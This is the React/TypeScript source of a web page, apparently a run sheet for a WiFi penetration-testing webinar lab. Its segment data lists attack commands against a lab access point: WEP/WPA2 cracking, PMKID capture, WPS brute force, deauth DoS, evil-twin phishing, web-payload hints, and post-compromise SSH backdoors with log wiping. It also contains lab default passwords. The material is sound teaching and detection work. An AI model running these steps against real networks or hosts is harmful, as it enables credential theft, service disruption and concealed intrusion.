"use client";

import * as React from "react";
import Link from "next/link";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { toast } from "sonner";

import { api } from "@/lib/api/client";
import { cn } from "@/lib/utils/cn";

/**
 * The WiFi Lab run-sheet: one card per segment, built from
 * docs/labs/wifi-pentest-webinar.md's segment table. Status is a judgement
 * call fixed by the lab setup (real hostapd AP, no injection-capable
 * tooling bundled), not something the API reports — so it's data here, not
 * derived.
 */

interface Lab {
  id: number;
  name: string;
  topology_slug: string;
  provider: string;
  status: string;
}

type SegmentStatus = "live" | "narrated";

// Approximate MITRE ATT&CK (Enterprise) mapping for discussion purposes —
// there's no official dedicated wifi matrix, so these are the closest
// tactic/technique for framing each segment, not a certified mapping.
interface AttackTag {
  tactic: string;
  technique: string;
}

interface Segment {
  id: string;
  title: string;
  status: SegmentStatus;
  statusNote?: string;
  target: "ap-target" | "kali-wifi" | "flipper" | "-";
  steps: string[];
  // Case-insensitive substrings that, when seen in the AP's hostapd
  // journal tail, mean "this segment's traffic just showed up".
  logMarkers: string[];
  attack?: AttackTag;
  // If set, the "Set scenario" buttons can jump ap-target straight into
  // this hostapd security mode for this segment.
  scenario?: WifiScenario;
}

type WifiScenario =
  | "open"
  | "wep"
  | "hidden-ssid"
  | "mac-filter"
  | "wpa2"
  | "wpa3"
  | "wpa3-transition"
  | "owe"
  | "owe-transition"
  | "wpa2-enterprise"
  | "wpa3-enterprise";

const SEGMENTS: Segment[] = [
  {
    id: "recon",
    title: "1. Recon / monitor mode",
    status: "live",
    target: "kali-wifi",
    steps: ["iw dev", "airmon-ng start <iface>", "iw dev  # confirm *mon interface"],
    logMarkers: [],
    attack: { tactic: "Reconnaissance", technique: "T1595" },
  },
  {
    id: "basic-bypass",
    title: "1b. Hidden SSID + MAC filtering bypass",
    status: "live",
    statusNote:
      "Two separate AP-side controls, two separate scenarios below — hidden SSID doesn't imply MAC " +
      "filtering is also on, or vice versa. Both found missing a working demo target when checked " +
      "against the HTB curriculum directly: neither control existed in any prior scenario here.",
    target: "ap-target",
    steps: [
      "Set scenario: Hidden SSID (button below)",
      "airodump-ng shows a blank/<length: N> SSID — wait for a client probe or deauth-triggered " +
        "reassociation to reveal the real name in a probe response",
      "Set scenario: MAC Filtering (button below)",
      "Associate with your adapter's real MAC — rejected",
      "macchanger -m AA:BB:CC:DD:EE:FF <iface>  # spoof to the one allowed address, then reassociate",
    ],
    logMarkers: ["denied", "disassoc"],
    attack: { tactic: "Defense Evasion", technique: "T1562" },
  },
  {
    id: "wep",
    title: "2. WEP attacks + crack",
    status: "live",
    statusNote:
      "Covers the full HTB WEP-attacks set against this one scenario: ARP-replay, fragmentation, " +
      "and KoreK chopchop all just need a client associated; café latte targets a client directly " +
      "and works even with ap-target powered off — add the 'wifi-client' role node for a client to " +
      "point it at.",
    target: "ap-target",
    steps: [
      "Set scenario: WEP (button below, or edit hostapd.conf by hand)",
      "On kali-wifi: airodump-ng -w cap <iface>; aireplay-ng --arpreplay -b <ap-mac> <iface>",
      "Fragmentation: aireplay-ng --fragment -b <ap-mac> <iface>  # builds a keystream, not a full key",
      "ChopChop: aireplay-ng --chopchop -b <ap-mac> <iface>",
      "Café latte (client only, AP can be off): aireplay-ng --caffe-latte -h <client-mac> <iface>",
      "aircrack-ng -w wordlist.txt cap-01.cap",
    ],
    logMarkers: ["wep"],
    attack: { tactic: "Credential Access", technique: "T1110.002" },
    scenario: "wep",
  },
  {
    id: "wpa2",
    title: "3. WPA2 handshake + crack",
    status: "live",
    statusNote: "Centerpiece — seed the wordlist with the real passphrase (LabForgeDemo123 by default)",
    target: "ap-target",
    steps: [
      "Set scenario: WPA2 (button below)",
      "airodump-ng --bssid <ap-mac> -c 6 -w cap <iface>",
      "aireplay-ng --deauth 5 -a <ap-mac> <iface>  # force a reassociation",
      "aircrack-ng -w wordlist.txt cap-01.cap",
    ],
    logMarkers: ["wpa", "4-way", "eapol", "handshake"],
    attack: { tactic: "Credential Access", technique: "T1110.002" },
    scenario: "wpa2",
  },
  {
    id: "pmkid",
    title: "4. PMKID capture",
    status: "live",
    statusNote: "No deauth needed — contrast with segment 3",
    target: "ap-target",
    steps: ["hcxdumptool -o pmkid.pcapng -i <iface> --enable_status=1", "hcxpcapngtool -o hashes.22000 pmkid.pcapng", "hashcat -m 22000 hashes.22000 wordlist.txt"],
    logMarkers: ["eapol"],
    attack: { tactic: "Credential Access", technique: "T1110.002" },
  },
  {
    id: "wps",
    title: "5. WPS process",
    status: "live",
    statusNote:
      "WPS rides on the WPA2 scenario (hostapd needs the full device-identity block, not just " +
      "wps_state, or wash sees nothing at all here — found missing entirely on a direct check " +
      "against the HTB curriculum, now fixed). wash/reaver's online-PIN and push-button flows are " +
      "genuinely live against this AP. Pixie-Dust specifically still won't fire — stock hostapd has " +
      "no vulnerable nonce bug — so that one step stays narrated: show the process, say why it stalls.",
    target: "ap-target",
    steps: [
      "Set scenario: WPA2 (button below) — WPS is enabled whenever WPA2 is active",
      "wash -i <iface>",
      "reaver -i <iface> -b <ap-mac> -vv",
      "Push-button config: hold the AP's (simulated) WPS button, reaver -i <iface> -b <ap-mac> -push-button-exchange -vv",
      "AP DoS during a PIN run: mdk4 <mon-iface> d -c 6  # crashes/locks the target, a real finding even when Pixie-Dust can't fire",
    ],
    logMarkers: ["wps"],
    attack: { tactic: "Credential Access", technique: "T1110.001" },
    scenario: "wpa2",
  },
  {
    id: "eviltwin",
    title: "6. Evil twin / captive portal",
    status: "live",
    statusNote:
      "Needs the 'captive-portal' role added to ap-target (alongside 'hostapd') — then run " +
      "fluxion/airgeddon/wifiphisher from kali-wifi against it, or hit it directly at " +
      "http://10.50.50.1/ once a client associates. A handheld Flipper Zero + Marauder run is " +
      "still the no-lab-changes fallback for an audience without a VM target.",
    target: "ap-target",
    steps: [
      "On kali-wifi: aireplay-ng --deauth 0 -a <ap-mac> <iface>  # push clients off the real AP",
      "wifiphisher -i <iface> -e LabForge-Demo-AP, or hand-roll with hostapd+dnsmasq on kali-wifi",
      "Walled-garden demo without a rogue AP: associate normally, then curl http://10.50.50.1/ — " +
        "try /login (SQLi), /?name=<script> (XSS), /upload (path traversal), " +
        "/admin -H 'Host: portal.internal' (host-header bypass), " +
        "/authorize?mac=<victim-mac> then /status?mac=<victim-mac> (MAC-spoofing bypass)",
    ],
    logMarkers: ["deauth"],
    attack: { tactic: "Credential Access", technique: "T1557" },
  },
  {
    id: "deauth",
    title: "7. Deauth-based DoS",
    status: "live",
    statusNote: "A real technique, not RF jamming",
    target: "ap-target",
    steps: [
      "aireplay-ng --deauth 0 -a <ap-mac> <iface>  # continuous",
      "mdk4 <mon-iface> d -b blacklist.txt  # alternate tool, scriptable against a MAC allowlist/denylist",
    ],
    logMarkers: ["deauth", "disassoc"],
    attack: { tactic: "Impact", technique: "T1498" },
  },
  {
    id: "wpa3",
    title: "8. WPA3 / SAE (pure)",
    status: "narrated",
    statusNote: "SAE resists offline dictionary attacks by design. On the cheap Realtek adapter specifically, hostapd refuses to even start in WPA3 mode — that driver doesn't advertise 802.11w (management frame protection), which SAE requires. Worth narrating as its own finding, not just the crypto argument.",
    target: "ap-target",
    steps: ["Set scenario: WPA3 (button below)", "Show a capture attempt failing, then explain why"],
    logMarkers: ["sae"],
    attack: { tactic: "Credential Access", technique: "T1110.002 (resisted by design)" },
    scenario: "wpa3",
  },
  {
    id: "wpa3-downgrade",
    title: "9. WPA3 transition-mode downgrade + Evil Twin",
    status: "live",
    statusNote:
      "Transition mode accepts both a WPA2-PSK and an SAE client on the same SSID, so a client " +
      "that would otherwise negotiate SAE can be talked down to the weaker PSK side — then cracked " +
      "like segment 3.",
    target: "ap-target",
    steps: [
      "Set scenario: WPA3 Transition (button below)",
      "On kali-wifi: aireplay-ng --deauth 5 -a <ap-mac> <iface>  # force a reassociation",
      "Clone the SSID as WPA2-only on a second adapter (airbase-ng/hostapd) to pull a transition-" +
        "aware client onto the rogue AP instead of SAE",
      "aircrack-ng -w wordlist.txt cap-01.cap  # same crack as segment 3, against the PSK side",
    ],
    logMarkers: ["sae", "wpa"],
    attack: { tactic: "Credential Access", technique: "T1557" },
    scenario: "wpa3-transition",
  },
  {
    id: "owe",
    title: "10. Enhanced Open (OWE)",
    status: "narrated",
    statusNote:
      "OWE has no PSK to crack — the live angle is that it authenticates the LINK, not the AP, so " +
      "a cloned SSID (open or OWE) is indistinguishable to a client.",
    target: "ap-target",
    steps: ["Set scenario: OWE (button below)", "airodump-ng shows an unauthenticated, encrypted AP — no handshake to capture"],
    logMarkers: ["owe"],
    attack: { tactic: "Credential Access", technique: "T1557 (link-only auth, not AP auth)" },
    scenario: "owe",
  },
  {
    id: "owe-transition",
    title: "10b. OWE Transition Mode Evil Twin",
    status: "live",
    statusNote:
      "Real OWE transition needs TWO BSSIDs (one Open, one OWE, each pointing at the other) — " +
      "unlike SAE's single-BSS transition mode in segment 9. The hostapd role tries to bring up a " +
      "second AP-mode VIF for this at provision time; whether the adapter/driver actually supports " +
      "two concurrent AP interfaces is hardware-dependent. If it doesn't, switching to this scenario " +
      "fails with a clear message instead of silently doing nothing — check that message before " +
      "assuming the lab is broken.",
    target: "ap-target",
    steps: [
      "Set scenario: OWE Transition (button below)",
      "airodump-ng shows two BSSIDs advertising the same pair of SSIDs — point out the " +
        "owe_transition_bssid/ssid elements tying them together",
      "Clone just the Open BSSID on kali-wifi (airbase-ng -e LabForge-Open) to strip a client down " +
        "to the unauthenticated side",
    ],
    logMarkers: ["owe"],
    attack: { tactic: "Credential Access", technique: "T1557" },
    scenario: "owe-transition",
  },
  {
    id: "enterprise",
    title: "11. WPA2/WPA3-Enterprise (802.1x / RADIUS)",
    status: "live",
    statusNote:
      "Needs a node with the 'freeradius' role in this lab's topology — the scenario buttons below " +
      "auto-discover its IP, no manual wiring. Test identity: labforge / LabForgeDemo123 (PEAP/" +
      "MSCHAPv2). Enterprise Evil-Twin / PEAP-relay against a real client still needs eaphammer " +
      "run from kali-wifi, same as the basic Evil Twin segment.",
    target: "ap-target",
    steps: [
      "Set scenario: WPA2-Enterprise or WPA3-Enterprise (buttons below)",
      "wpa_supplicant -i <iface> -Dnl80211 -c <eap.conf with labforge/LabForgeDemo123>",
      "eaphammer -i <iface> --cert-wizard  # Enterprise Evil Twin / PEAP relay, run manually",
      "Watch Access-Accept/Reject land live in the 'radius · freeradius log' panel on this dashboard",
    ],
    logMarkers: ["eap", "wpa"],
    attack: { tactic: "Credential Access", technique: "T1110" },
    scenario: "wpa2-enterprise",
  },
  {
    id: "post-compromise",
    title: "12. Post-compromise: SSH persistence & log tampering",
    status: "live",
    statusNote:
      "Be precise with the audience here: real Salt Typhoon reporting (CISA/Talos, 2024-2025) " +
      "describes router management-plane/firmware/SSH compromise, not 802.11-layer attacks — there's " +
      "no public reporting of deauth/rogue-AP/WPS abuse in that campaign. Don't claim segments 1-11 " +
      "ARE Salt Typhoon. The honest framing: any of those WiFi-layer attacks is a plausible way a " +
      "real attacker gets an initial foothold on a SOHO device, and what happens next — new SSH " +
      "keys, new local accounts, clearing logs to cover tracks — is the actual, well-documented " +
      "post-compromise playbook from that reporting, fully reproducible here because ap-target is a " +
      "real Debian box reachable over SSH once any prior segment gets you onto its network.",
    target: "ap-target",
    steps: [
      "From kali-wifi, SSH to ap-target with whatever credentials the prior segment yielded " +
        "(vagrant/ChangeMe123 by default)",
      "Persistence — add a key: echo '<attacker-pubkey>' >> ~/.ssh/authorized_keys",
      "Persistence — new account: sudo useradd -m backdoor && sudo passwd backdoor",
      "Defense evasion — try to cover tracks: sudo journalctl --vacuum-time=1s ; sudo truncate -s0 " +
        "/var/log/auth.log",
      "Watch the Wazuh dashboard on siem: each step above should land as its own alert within " +
        "seconds (FIM on authorized_keys/passwd, new-account creation, the log-tampering attempt " +
        "itself) — the point being that covering your tracks is the signal that gets you caught.",
    ],
    logMarkers: ["authorized_keys", "useradd", "backdoor"],
    attack: { tactic: "Persistence", technique: "T1098 / T1136 / T1070" },
  },
];

// Groups the run-sheet into named phases so a 13-segment list reads as a
// story (recon → legacy → personal crypto → social engineering → DoS →
// enterprise) instead of a flat scroll. Referencing SEGMENTS.id keeps this
// a presentation-only grouping — it doesn't change segment numbering, and
// a segment left out of every list here still renders, just ungrouped, so
// adding a new segment can never silently vanish from the page.
const SEGMENT_PHASES: Array<{ label: string; ids: string[] }> = [
  { label: "Recon & basic bypass", ids: ["recon", "basic-bypass"] },
  { label: "WEP", ids: ["wep"] },
  { label: "WPA2 / WPA3 Personal", ids: ["wpa2", "pmkid", "wps", "wpa3", "wpa3-downgrade", "owe", "owe-transition"] },
  { label: "Social engineering", ids: ["eviltwin"] },
  { label: "Denial of service", ids: ["deauth"] },
  { label: "Enterprise (802.1x)", ids: ["enterprise"] },
  { label: "Post-compromise (SOHO-router-compromise analogy)", ids: ["post-compromise"] },
];

function segmentPhase(id: string): string | null {
  return SEGMENT_PHASES.find((p) => p.ids.includes(id))?.label ?? null;
}

// Grouped so the button row wraps by meaning instead of by whatever fits on
// a line — matters on a projector at a narrower resolution, where 9 flat
// buttons wrap mid-group and the presenter loses track of which row is which.
const SCENARIO_GROUPS: Array<{ label: string; scenarios: Array<{ id: WifiScenario; label: string }> }> = [
  {
    label: "Open / legacy",
    scenarios: [
      { id: "open", label: "Open" },
      { id: "wep", label: "WEP" },
    ],
  },
  {
    label: "Basic control bypass",
    scenarios: [
      { id: "hidden-ssid", label: "Hidden SSID" },
      { id: "mac-filter", label: "MAC Filtering" },
    ],
  },
  {
    label: "Personal (PSK/SAE)",
    scenarios: [
      { id: "wpa2", label: "WPA2" },
      { id: "wpa3", label: "WPA3" },
      { id: "wpa3-transition", label: "WPA3 Transition" },
      { id: "owe", label: "OWE" },
      { id: "owe-transition", label: "OWE Transition" },
    ],
  },
  {
    label: "Enterprise (802.1x)",
    scenarios: [
      { id: "wpa2-enterprise", label: "WPA2-Enterprise" },
      { id: "wpa3-enterprise", label: "WPA3-Enterprise" },
    ],
  },
];
const SCENARIOS: Array<{ id: WifiScenario; label: string }> = SCENARIO_GROUPS.flatMap((g) => g.scenarios);

// Structured events parsed out of the raw hostapd journal tail — reading
// "STA aa:bb:.. associated" off the screen is a better visual for an
// audience than scrolling syslog text.
interface ParsedEvent {
  id: string;
  time: string;
  type: "ap-enabled" | "associated" | "disassociated" | "deauth" | "handshake" | "eapol" | "other";
  mac: string | null;
  raw: string;
}

function parseEvents(lines: string[]): ParsedEvent[] {
  const macRe = /STA ([0-9a-f]{2}(?::[0-9a-f]{2}){5})/i;
  const timeRe = /^(\w+\s+\d+\s+[\d:]+)/;
  const out: ParsedEvent[] = [];
  lines.forEach((raw, i) => {
    const lower = raw.toLowerCase();
    let type: ParsedEvent["type"] | null = null;
    if (lower.includes("ap-enabled")) type = "ap-enabled";
    else if (lower.includes("disassociat")) type = "disassociated";
    else if (lower.includes("deauth")) type = "deauth";
    else if (lower.includes("pairwise key handshake completed") || lower.includes("4-way")) type = "handshake";
    else if (lower.includes("eapol")) type = "eapol";
    else if (/\bassociated\b/.test(lower)) type = "associated";
    if (!type) return;
    const time = timeRe.exec(raw)?.[1] ?? "";
    const mac = macRe.exec(raw)?.[1] ?? null;
    out.push({ id: `${i}-${raw.slice(0, 20)}`, time, type, mac, raw });
  });
  return out;
}

const EVENT_LABEL: Record<ParsedEvent["type"], string> = {
  "ap-enabled": "AP enabled",
  associated: "Client associated",
  disassociated: "Client disassociated",
  deauth: "Deauth frame",
  handshake: "4-way handshake complete",
  eapol: "EAPOL activity",
  other: "Event",
};

const EVENT_TONE: Record<ParsedEvent["type"], Parameters<typeof cn>[1]> = {
  "ap-enabled": "live",
  associated: "live",
  disassociated: "warn",
  deauth: "warn",
  handshake: "live",
  eapol: "",
  other: "",
};

function StatusBadge({ status }: { status: SegmentStatus }) {
  return (
    <span className={cn("badge", status === "live" ? "live" : "warn")}>
      <span className="d" />
      {status === "live" ? "Live" : "Narrated"}
    </span>
  );
}

function SegmentCard({
  seg,
  active,
  onSelect,
  hit,
}: {
  seg: Segment;
  active: boolean;
  onSelect: () => void;
  hit: boolean;
}) {
  return (
    <div
      id={`segment-${seg.id}`}
      className="card s12"
      style={{
        cursor: "pointer",
        borderColor: active ? "var(--accent, #3b82f6)" : undefined,
        marginBottom: 10,
        scrollMarginTop: 16,
      }}
      onClick={onSelect}
      role="button"
      tabIndex={0}
      aria-expanded={active}
      onKeyDown={(e) => {
        if (e.key === "Enter" || e.key === " ") onSelect();
      }}
    >
      <div className="card-h">
        <h3>{seg.title}</h3>
        <div className="grow" />
        {seg.attack && (
          <span className="badge mono" title="Approximate MITRE ATT&CK mapping, for discussion">
            {seg.attack.tactic} · {seg.attack.technique}
          </span>
        )}
        {hit && (
          <span className="badge live" title="Matching activity just seen in the AP log">
            <span className="d" />
            matched
          </span>
        )}
        <StatusBadge status={seg.status} />
      </div>
      <div className="card-b" style={{ fontSize: 13 }}>
        {seg.statusNote && (
          <div style={{ color: "var(--ink-mute)", marginBottom: 8, fontStyle: "italic" }}>{seg.statusNote}</div>
        )}
        <div style={{ marginBottom: 6 }}>
          <span className="mono" style={{ color: "var(--ink-mute)" }}>
            target: {seg.target}
          </span>
        </div>
        {active && (
          <ol style={{ margin: 0, paddingLeft: 20, display: "flex", flexDirection: "column", gap: 4 }}>
            {seg.steps.map((s, i) => (
              <li key={i} className="mono" style={{ fontSize: 12.5 }}>
                {s}
              </li>
            ))}
          </ol>
        )}
      </div>
    </div>
  );
}

export default function WebinarPage() {
  const qc = useQueryClient();
  const { data: allLabs = [] } = useQuery<Lab[]>({
    queryKey: ["labs"],
    queryFn: () => fetch("/api/v1/labs").then((r) => r.json()),
    refetchInterval: 8000,
  });
  // This run sheet only drives the WiFi lab's own hostapd scenarios/logs —
  // picking an unrelated lab (log4shell, ransomware hunt, ...) here would
  // just 404 every panel. Filter to the wifi topology rather than showing
  // every lab the user has ever built.
  const labs = React.useMemo(() => allLabs.filter((l) => l.topology_slug === "wifi-lab"), [allLabs]);

  const [labId, setLabId] = React.useState<number | null>(null);
  React.useEffect(() => {
    if (labId === null && labs.length > 0) setLabId(labs[0]!.id);
  }, [labs, labId]);

  const [activeSegment, setActiveSegment] = React.useState<string>(SEGMENTS[0]!.id);
  // The last scenario switch's outcome, kept on screen next to the buttons
  // rather than only in a toast that disappears after a few seconds — on
  // stage, "wait, which mode are we in" is exactly the moment a vanished
  // toast is useless. Cleared whenever the lab selection changes.
  const [lastScenario, setLastScenario] = React.useState<{ id: WifiScenario; ok: boolean; message: string } | null>(
    null,
  );
  React.useEffect(() => setLastScenario(null), [labId]);
  const [downloading, setDownloading] = React.useState(false);

  const apLogQ = useQuery<string[]>({
    queryKey: ["node-log", labId, "ap-target", "hostapd"],
    queryFn: () => api.getNodeLog(labId as number, "ap-target", "hostapd", 150),
    enabled: labId !== null,
    // Each call pays vagrant ssh's own Ruby/Vagrant startup cost (observed
    // ~35-40s on Windows) on top of the journalctl itself — polling faster
    // than that just piles up overlapping subprocess calls, not fresher data.
    refetchInterval: 20000,
  });

  // RADIUS auth activity for segment 11 — kept in its own pane so "SSH into
  // radius for journalctl" (the old instruction) isn't needed to see
  // Access-Accept/Reject land during the Enterprise segment, same as
  // hostapd's log needs no SSH either.
  const radiusLogQ = useQuery<string[]>({
    queryKey: ["node-log", labId, "radius", "freeradius"],
    queryFn: () => api.getNodeLog(labId as number, "radius", "freeradius", 100),
    enabled: labId !== null,
    refetchInterval: 20000,
  });

  const scenarioMut = useMutation({
    mutationFn: (scenario: WifiScenario) => api.setWifiScenario(labId as number, "ap-target", scenario),
    onSuccess: (res, scenario) => {
      setLastScenario({ id: scenario, ok: res.ok, message: res.message });
      if (res.ok) {
        toast.success("Scenario applied", { description: res.message });
        void qc.invalidateQueries({ queryKey: ["node-log", labId, "ap-target", "hostapd"] });
      } else {
        toast.error("Could not switch scenario", { description: res.message });
      }
    },
    onError: (err: Error, scenario) => {
      setLastScenario({ id: scenario, ok: false, message: err.message });
      toast.error("Could not switch scenario", { description: err.message });
    },
  });

  const downloadCapture = React.useCallback(async () => {
    if (labId === null) return;
    setDownloading(true);
    try {
      const blob = await api.fetchNodeFile(labId, "ap-target", "capture.pcap");
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "ap-target-capture.pcap";
      a.click();
      URL.revokeObjectURL(url);
    } catch (err) {
      const apiErr = err as { detail?: string; message?: string };
      toast.error("Could not download capture.pcap", { description: apiErr.detail ?? apiErr.message ?? String(err) });
    } finally {
      setDownloading(false);
    }
  }, [labId]);

  const lines = apLogQ.data ?? [];
  const active = SEGMENTS.find((s) => s.id === activeSegment) ?? SEGMENTS[0]!;
  const events = React.useMemo(() => parseEvents(lines), [lines]);

  // Which segments have matching lines anywhere in the current tail — lets
  // the whole run-sheet light up, not just the one currently expanded.
  const hits = React.useMemo(() => {
    const lower = lines.map((l) => l.toLowerCase());
    const out = new Set<string>();
    for (const seg of SEGMENTS) {
      if (seg.logMarkers.length === 0) continue;
      if (lower.some((l) => seg.logMarkers.some((m) => l.includes(m)))) out.add(seg.id);
    }
    return out;
  }, [lines]);

  return (
    <main className="page">
      <div className="pagehead">
        <div className="grow">
          <Link href="/wifi-lab" className="sub mono" style={{ display: "inline-block", marginBottom: 4 }}>
            ← Architecture
          </Link>
          <h1 className="h1">WiFi Lab — run sheet</h1>
          <div className="meta mono">
            {SEGMENTS.length} segments · {SEGMENTS.filter((s) => s.status === "live").length} live ·{" "}
            {SEGMENTS.filter((s) => s.status === "narrated").length} narrated
          </div>
        </div>
        <select
          className="h-8 rounded-md border border-input bg-background px-2 text-sm"
          value={labId ?? ""}
          onChange={(e) => setLabId(e.target.value ? Number(e.target.value) : null)}
          aria-label="Lab to watch"
        >
          <option value="">No lab selected</option>
          {labs.map((l) => (
            <option key={l.id} value={l.id}>
              {l.name} (#{l.id}, {l.status})
            </option>
          ))}
        </select>
      </div>

      <div
        className="mono"
        style={{
          display: "flex",
          gap: 6,
          flexWrap: "wrap",
          marginTop: 12,
          fontSize: 11.5,
        }}
        aria-label="Jump to segment"
      >
        {SEGMENTS.map((seg) => (
          <button
            key={seg.id}
            type="button"
            className={cn("btn sm", seg.id === activeSegment ? "primary" : "ghost")}
            title={seg.title}
            onClick={() => {
              setActiveSegment(seg.id);
              document.getElementById(`segment-${seg.id}`)?.scrollIntoView({ behavior: "smooth", block: "start" });
            }}
          >
            {seg.title.split(".")[0]}
          </button>
        ))}
      </div>

      <div className="card s12" style={{ marginTop: 18, marginBottom: 18 }}>
        <div className="card-h">
          <h3>ap-target scenario</h3>
          <div className="sub mono">rewrites hostapd.conf and restarts hostapd — no SSH needed</div>
          <div className="grow" />
          {lastScenario && (
            <span
              className={cn("badge", lastScenario.ok ? "live" : "warn")}
              title={lastScenario.message}
            >
              <span className="d" />
              current: {SCENARIOS.find((s) => s.id === lastScenario.id)?.label ?? lastScenario.id}
              {!lastScenario.ok && " (failed)"}
            </span>
          )}
          {lines.length > 0 && labId !== null && (
            <button type="button" className="btn sm" disabled={downloading} onClick={downloadCapture}>
              {downloading ? "Downloading…" : "Download capture.pcap"}
            </button>
          )}
        </div>
        <div className="card-b" style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          {SCENARIO_GROUPS.map((group) => (
            <div key={group.label} style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
              <span className="mono" style={{ color: "var(--ink-mute)", fontSize: 11, minWidth: 130 }}>
                {group.label}
              </span>
              {group.scenarios.map((s) => (
                <button
                  key={s.id}
                  type="button"
                  className={cn("btn sm", lastScenario?.id === s.id && lastScenario.ok ? "primary" : undefined)}
                  disabled={labId === null || scenarioMut.isPending}
                  onClick={() => scenarioMut.mutate(s.id)}
                >
                  {scenarioMut.isPending && scenarioMut.variables === s.id ? "Applying…" : `Set ${s.label}`}
                </button>
              ))}
            </div>
          ))}
          {lastScenario && !lastScenario.ok && (
            <div
              className="mono"
              style={{ fontSize: 12, color: "var(--red, #ef4444)", borderTop: "1px solid var(--line)", paddingTop: 8 }}
            >
              Last switch ({lastScenario.id}) failed: {lastScenario.message}
            </div>
          )}
        </div>
      </div>

      <div className="grid12">
        <div className="s8">
          {SEGMENTS.map((seg, i) => {
            const phase = segmentPhase(seg.id);
            const prevPhase = i > 0 ? segmentPhase(SEGMENTS[i - 1]!.id) : null;
            return (
              <React.Fragment key={seg.id}>
                {phase !== null && phase !== prevPhase && (
                  <div
                    className="mono"
                    style={{
                      fontSize: 11,
                      color: "var(--ink-faint)",
                      textTransform: "uppercase",
                      letterSpacing: "0.04em",
                      margin: i === 0 ? "0 0 6px 2px" : "18px 0 6px 2px",
                    }}
                  >
                    {phase}
                  </div>
                )}
                <SegmentCard
                  seg={seg}
                  active={seg.id === activeSegment}
                  onSelect={() => setActiveSegment(seg.id)}
                  hit={hits.has(seg.id)}
                />
              </React.Fragment>
            );
          })}

          <div className="card s12" style={{ marginTop: 10 }}>
            <div className="card-h">
              <h3>Parsed events</h3>
              <div className="sub mono">{events.length} of {lines.length} lines understood</div>
            </div>
            <div style={{ maxHeight: 280, overflowY: "auto" }}>
              {events.length === 0 ? (
                <div className="card-b" style={{ color: "var(--ink-mute)", fontSize: 13 }}>
                  No associations, deauths, or handshakes seen yet in the current tail.
                </div>
              ) : (
                <table className="mono" style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                  <thead>
                    <tr style={{ textAlign: "left", color: "var(--ink-mute)", borderBottom: "1px solid var(--line)" }}>
                      <th style={{ padding: "6px 10px" }}>Time</th>
                      <th style={{ padding: "6px 10px" }}>Event</th>
                      <th style={{ padding: "6px 10px" }}>Client MAC</th>
                    </tr>
                  </thead>
                  <tbody>
                    {events.slice().reverse().map((ev) => (
                      <tr key={ev.id} style={{ borderBottom: "1px solid var(--line)" }}>
                        <td style={{ padding: "6px 10px", color: "var(--ink-mute)" }}>{ev.time}</td>
                        <td style={{ padding: "6px 10px" }}>
                          <span className={cn("badge", EVENT_TONE[ev.type])}>
                            <span className="d" />
                            {EVENT_LABEL[ev.type]}
                          </span>
                        </td>
                        <td style={{ padding: "6px 10px" }}>{ev.mac ?? "—"}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>

          <div className="card s12" style={{ marginTop: 10 }}>
            <div className="card-h">
              <h3>Extending this lab</h3>
            </div>
            <div className="card-b" style={{ fontSize: 12.5, color: "var(--ink-mute)", display: "flex", flexDirection: "column", gap: 6 }}>
              <div>
                <b style={{ color: "var(--ink)" }}>wifi-client role</b> — add a node with roles{" "}
                <code className="mono">[&quot;wifi-client&quot;]</code> and its own passed-through USB adapter to get a
                station that auto-associates to this AP, so deauth/handshake demos always have a real client even
                without an audience volunteer.
              </div>
              <div>
                <b style={{ color: "var(--ink)" }}>Pair with an IDS</b> — add the <code className="mono">suricata</code>{" "}
                or <code className="mono">zeek</code> role to a node on the same network to show network-layer
                detection alongside hostapd&apos;s own log — two different &quot;how does the defender see this&quot;
                stories in the same segment.
              </div>
            </div>
          </div>
        </div>

        <div className="card s4" style={{ position: "sticky", top: 16, alignSelf: "flex-start" }}>
          <div className="card-h">
            <h3>ap-target · hostapd log</h3>
            <div className="sub mono">polls every 20s · {lines.length} lines</div>
          </div>
          <div style={{ padding: "0 4px" }}>
            <div
              className="mono"
              style={{
                margin: 0,
                padding: 10,
                fontSize: 11,
                lineHeight: 1.5,
                maxHeight: 520,
                overflowY: "auto",
                background: "var(--bg-1)",
                color: "var(--ink-dim)",
              }}
            >
              {labId === null ? (
                <span style={{ color: "var(--ink-faint)" }}>Pick a lab above to watch its AP log.</span>
              ) : lines.length === 0 ? (
                <span style={{ color: "var(--ink-faint)" }}>
                  {apLogQ.isLoading ? "Connecting…" : "No log lines yet."}
                </span>
              ) : (
                lines.map((ln, idx) => {
                  const lower = ln.toLowerCase();
                  const isMarker = active.logMarkers.some((m) => lower.includes(m));
                  return (
                    <div key={idx} style={{ color: isMarker ? "var(--green)" : undefined }}>
                      {ln || " "}
                    </div>
                  );
                })
              )}
            </div>
          </div>
          <div className="card-b" style={{ fontSize: 11.5, color: "var(--ink-mute)" }}>
            Lines matching the selected segment&apos;s markers (
            {active.logMarkers.join(", ") || "none for this segment"}) are highlighted. This reads the guest&apos;s
            own <code className="mono">journalctl -u hostapd</code> over <code className="mono">vagrant ssh</code> —
            it needs the lab actually built and running.
          </div>
        </div>

        {activeSegment === "enterprise" && (
          <div className="card s4" style={{ marginTop: 10 }}>
            <div className="card-h">
              <h3>radius · freeradius log</h3>
              <div className="sub mono">polls every 20s · {(radiusLogQ.data ?? []).length} lines</div>
            </div>
            <div style={{ padding: "0 4px" }}>
              <div
                className="mono"
                style={{
                  margin: 0,
                  padding: 10,
                  fontSize: 11,
                  lineHeight: 1.5,
                  maxHeight: 280,
                  overflowY: "auto",
                  background: "var(--bg-1)",
                  color: "var(--ink-dim)",
                }}
              >
                {labId === null ? (
                  <span style={{ color: "var(--ink-faint)" }}>Pick a lab above to watch the RADIUS log.</span>
                ) : (radiusLogQ.data ?? []).length === 0 ? (
                  <span style={{ color: "var(--ink-faint)" }}>
                    {radiusLogQ.isLoading ? "Connecting…" : "No log lines yet."}
                  </span>
                ) : (
                  (radiusLogQ.data ?? []).map((ln, idx) => {
                    const lower = ln.toLowerCase();
                    const isMarker = lower.includes("access-accept") || lower.includes("access-reject");
                    return (
                      <div key={idx} style={{ color: isMarker ? "var(--green)" : undefined }}>
                        {ln || " "}
                      </div>
                    );
                  })
                )}
              </div>
            </div>
            <div className="card-b" style={{ fontSize: 11.5, color: "var(--ink-mute)" }}>
              Reads <code className="mono">journalctl -u freeradius</code> on the node with the{" "}
